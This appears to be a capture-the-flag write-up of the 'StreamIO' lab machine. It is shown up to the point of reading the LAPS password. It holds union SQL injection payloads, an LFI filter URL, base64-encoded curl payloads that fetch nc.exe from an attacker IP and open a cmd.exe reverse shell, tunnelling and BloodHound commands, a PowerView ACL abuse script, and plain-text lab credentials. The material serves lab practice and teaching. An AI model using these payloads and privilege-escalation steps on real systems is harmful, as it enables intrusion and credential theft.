### Web Enumration

On **Port 80** there was nothing, just IIS welcome screen, however on **Port 443 (https://streamio.htb/)** there is a login page as well as register page but can't login with new user we registerd.

Moving on to **https://watch.streamio.htb/** , here we have is a list of all movies. On doing `Dir Busting` got an interesting page:
- `search.php`

We can search movies here, so after trying manul union `SQLi` we can enumrate the database, since `sqlmap` was not working as page had some blacklist.
<img src="../../resources/streamio/20220708165200.png">

On after enumrating Database got some usernames and password hashes.

```text
'+UNION+SELECT+1,password,3,4,5,6+FROM+dbo.users+--+-
```

Some of the hashes were available on [CrackStation](https://crackstation.net/)

Now since correct Username and Password is not sure , did a `clusterbomb` attack on **Login Page** on `https://streamio.htb/`
and found a correct pair:

```text
yoshihide : 66boysandgirls..
```

# Foothold

Now since we can Login and there is nothing much at front, found `admin` page by doing `Dir busting`.

On admin page there are different features for user and each we are accessing each feature as some **GET** paramter, so on fuzzing it found `debug` paramter.

This paramter was vulnerable to `LFI`. Reading `Index.php` :

```text
https://streamio.htb/admin/?debug=php://filter/read=convert.base64-encode/resource=index.php
```

We can inculde any file from the system with absolute path and found credentials for `db_admin` .

```text
db_admin : B1@hx31234567890
```

Therefore searching for some other files, found `mater.php` which have `eval()` function on `include` POST paramter.

So we can exploit it and get Reverse Shell by uploading it and executing it.

```shell-session
$ curl -X POST --data "include=data://text/plain;base64,c3lzdGVtKCJjZXJ0dXRpbC5leGUgLXVybGNhY2hlIC1mIGh0dHA6Ly8xMC4xMC4xNC4yNy9uYy5leGUgbmMuZXhlIik7" "https://streamio.htb/admin/?debug=master.php" --cookie "PHPSESSID=<SESSION_ID>" -k

$ curl -X POST --data "include=data://text/plain;base64,c3lzdGVtKCJuYy5leGUgMTAuMTAuMTQuMjcgOTAwMSAtZSBjbWQuZXhlIik7" "https://streamio.htb/admin/?debug=master.php" --cookie "PHPSESSID=<SESSION_ID>" -k
```

#### Enumrating Database

Since we got the Database Credentials and we can see it's runnning 
![2](../../resources/streamio/20220708171524.png)
we can access it by tunneling our traffic, I used `chisel` : 

```text
.\chisel.exe client <Att._IP>:5555 R:4000:10.10.11.158:1433/tcp
```

After accessing the database using `impacket-mssqlclient`

```text
impacket-mssqlclient streamio.htb/db_admin@127.0.0.1 -port 4000
```

There was a `backup` Database which had some usernames and password hashes. One of them is user on system as well.

```text
nikk37 : get_dem_girls2@yahoo.com
```

# Privilage  Escalation
We can login as `nikk37` using `Evil-winRM`,
Running `winPEAS` and found an Intersting file

![3](../../resources/streamio/20220708172334.png)

We can get some passwords from it.
Tool used : [FirePWD](https://github.com/lclevy/firepwd)

```text
admin JDg0dd1s@d0p3cr3@t0r
nikk37 n1kk1sd0p3t00
yoshihide paddpadd@12
JDgodd password@12
```

Password for `JDgodd` is `JDg0dd1s@d0p3cr3@t0r` it was just a guess `uwu` , after getting authencation failed in Last step.

### Using BloodHound
Using `bloodhound-python` to enumerate **AD** 

```shell
$ bloodhound-python -u nikk37 -p 'get_dem_girls2@yahoo.com' -ns 10.10.11.158 -d streamio.htb -c All
```

> I used `SharpHound` as well but it was not collecting any Information about user, Don't know why but somehow `bloodhound-python` was

![4](../../resources/streamio/20220708173434.png)

`JDgodd` user have `write` permissions on `CORE STAFF` group

And again `CORE STAFF` group members have `ReadLAPSPassword` rights.

![5](../../resources/streamio/20220708173656.png)

**Path to Follow : **

`JDgodd` have `write` rights on `CORE STAFF` we can add `JDgodd` itself into `CORE STAFF` group.
Since we cannot create any other user as any of our owned user is not a member of `Account Operator` group which is a special group in **AD** even though bloodhoud shows that `nikk37` is a member of this group but it is not.

```powershell
Import-Module .\PowerView.ps1

$SecPassword = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText -Force

$Cred = New-Object System.Management.Automation.PSCredential('streamio\JDgodd', $SecPassword)

Add-DomainObjectAcl -Credential $Cred -TargetIdentity "CORE STAFF" -PrincipalIdentity JDgodd -Rights All 

Add-DomainGroupMember -Identity 'CORE STAFF' -Members 'streamio\JDgodd' -Credential $Cred

Get-DomainGroupMember -Identity 'CORE STAFF'
```

And now we can read `LAPS` Password :
